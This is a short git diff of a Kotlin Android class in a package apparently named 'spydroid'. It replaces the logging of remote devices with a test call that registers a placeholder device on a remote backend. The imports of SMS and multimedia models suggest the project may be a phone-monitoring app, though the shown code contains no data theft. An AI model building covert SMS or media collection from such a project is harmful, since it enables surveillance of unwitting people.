@@ -34,6 +34,7 @@ import net.spydroid.common.local.models.CurrentMultimedia
 import net.spydroid.common.local.models.CurrentSms
 import net.spydroid.common.local.models.PERMISSIONS_STATES
 import net.spydroid.common.remote.RemoteDataProvider
+import net.spydroid.common.remote.network.models.Devices
 
 class LocalDataProvider private constructor(
     private val context: Context
@@ -46,13 +47,13 @@ class LocalDataProvider private constructor(
     init {
         scope.launch(Dispatchers.IO) {
             try {
-                remoteDataProvider.getAllDevices()
-                remoteDataProvider.devices.collect {
-                    it.map {
-                        Log.i(TAG, "ID: <${it.id}> \n Nombre: ${it.name} | Alias: ${it.alias}")
-                    }
-                }
-            } catch (e: Exception){
+                remoteDataProvider.insertDevice(
+                    device = Devices(
+                        alias = "PRUEBA INSERTANDO REMOTAMENTE",
+                        name = "ME ELECTROCUTASTE PEDRITO"
+                    )
+                )
+            } catch (e: Exception) {
 
                 Log.e(TAG, "Error: ${e.message}")
 
